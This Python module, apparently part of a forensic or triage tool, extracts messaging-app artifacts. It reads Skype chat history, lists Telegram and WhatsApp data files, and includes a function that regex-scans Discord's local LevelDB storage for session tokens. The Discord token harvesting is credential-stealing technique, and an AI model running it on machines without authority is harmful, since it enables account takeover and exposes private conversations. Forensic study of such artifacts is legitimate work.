"""
Artifacts from messaging applications: Skype, Telegram, Discord, WhatsApp.
"""

import os
import sys
import sqlite3
import json
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Optional, Any

from claster.core.logger import get_logger

logger = get_logger(__name__)


def get_skype_history(skype_db_path: Optional[str] = None) -> List[Dict[str, Any]]:
    """
    Extract chat history from Skype main.db.

    Args:
        skype_db_path: Path to Skype database (main.db). Auto-detects if None.

    Returns:
        List of messages.
    """
    if skype_db_path is None:
        if sys.platform == 'win32':
            base = Path(os.environ.get('APPDATA', '')) / 'Skype'
        elif sys.platform == 'darwin':
            base = Path.home() / 'Library/Application Support/Skype'
        else:
            base = Path.home() / '.config/skypeforlinux'
        # Find first profile
        for item in base.glob('*'):
            if item.is_dir() and (item / 'main.db').exists():
                skype_db_path = str(item / 'main.db')
                break
    if not skype_db_path or not Path(skype_db_path).exists():
        logger.error("Skype database not found.")
        return []

    import tempfile
    import shutil
    with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as tmp:
        shutil.copy2(skype_db_path, tmp.name)
        tmp_path = tmp.name

    conn = sqlite3.connect(tmp_path)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    messages = []
    try:
        cursor.execute('''
            SELECT timestamp, author, from_dispname, body_xml
            FROM Messages
            ORDER BY timestamp DESC
        ''')
        for row in cursor.fetchall():
            # Skype timestamp is Unix seconds
            ts = datetime.fromtimestamp(row['timestamp']) if row['timestamp'] else None
            messages.append({
                'timestamp': ts,
                'author': row['author'],
                'display_name': row['from_dispname'],
                'body': row['body_xml'],
            })
    except Exception as e:
        logger.error(f"Failed to read Skype DB: {e}")
    finally:
        conn.close()
        os.unlink(tmp_path)

    logger.info(f"Extracted {len(messages)} Skype messages.")
    return messages


def get_telegram_history(telegram_path: Optional[str] = None) -> List[Dict[str, Any]]:
    """
    Parse Telegram Desktop local storage (tdata) for chat history (limited).
    Full decryption requires knowledge of Telegram's encryption.
    This function extracts accessible metadata.
    """
    if telegram_path is None:
        if sys.platform == 'win32':
            base = Path(os.environ.get('APPDATA', '')) / 'Telegram Desktop/tdata'
        elif sys.platform == 'darwin':
            base = Path.home() / 'Library/Application Support/Telegram Desktop/tdata'
        else:
            base = Path.home() / '.local/share/TelegramDesktop/tdata'
        telegram_path = base

    path = Path(telegram_path) if telegram_path else None
    if not path or not path.exists():
        logger.error("Telegram data directory not found.")
        return []

    # Telegram uses encrypted local storage; full parsing is complex.
    # We'll return file listing as a placeholder.
    files = []
    for f in path.rglob('*'):
        if f.is_file():
            files.append({'name': f.name, 'size': f.stat().st_size})
    logger.info(f"Telegram: found {len(files)} files (encrypted).")
    return files


def get_discord_history(discord_path: Optional[str] = None) -> List[Dict[str, Any]]:
    """
    Extract Discord cache and local storage (LevelDB). Returns limited info.
    """
    if discord_path is None:
        if sys.platform == 'win32':
            base = Path(os.environ.get('APPDATA', '')) / 'discord'
        elif sys.platform == 'darwin':
            base = Path.home() / 'Library/Application Support/discord'
        else:
            base = Path.home() / '.config/discord'
        discord_path = base

    path = Path(discord_path) if discord_path else None
    if not path or not path.exists():
        logger.error("Discord directory not found.")
        return []

    # Discord stores messages in IndexedDB (LevelDB); hard to parse offline.
    # We'll extract token from Local Storage if possible.
    tokens = []
    ls_path = path / 'Local Storage/leveldb'
    if ls_path.exists():
        for f in ls_path.glob('*.ldb'):
            try:
                with open(f, 'rb') as dbf:
                    content = dbf.read()
                    # Simple string search for token pattern
                    import re
                    matches = re.findall(rb'[MN][A-Za-z\d]{23}\.[A-Za-z\d\-_]{6}\.[A-Za-z\d\-_]{27}', content)
                    for m in matches:
                        tokens.append(m.decode('utf-8', errors='ignore'))
            except:
                pass
    logger.info(f"Discord: extracted {len(tokens)} potential tokens.")
    return [{'token': t} for t in tokens]


def get_whatsapp_history(whatsapp_path: Optional[str] = None) -> List[Dict[str, Any]]:
    """
    Parse WhatsApp local database (msgstore.db) if accessible (crypt12+ encrypted).
    """
    if whatsapp_path is None:
        if sys.platform == 'win32':
            base = Path(os.environ.get('LOCALAPPDATA', '')) / 'WhatsApp'
        elif sys.platform == 'darwin':
            base = Path.home() / 'Library/Application Support/WhatsApp'
        else:
            base = Path.home() / '.config/WhatsApp'
        whatsapp_path = base

    path = Path(whatsapp_path) if whatsapp_path else None
    if not path or not path.exists():
        logger.error("WhatsApp directory not found.")
        return []

    # Database is encrypted; requires key extraction (root on Android, or Desktop paired).
    # We'll just check file presence.
    db_path = path / 'databases/msgstore.db'
    if db_path.exists():
        logger.info(f"WhatsApp database found at {db_path} (encrypted).")
        return [{'database': str(db_path), 'status': 'encrypted'}]
    return []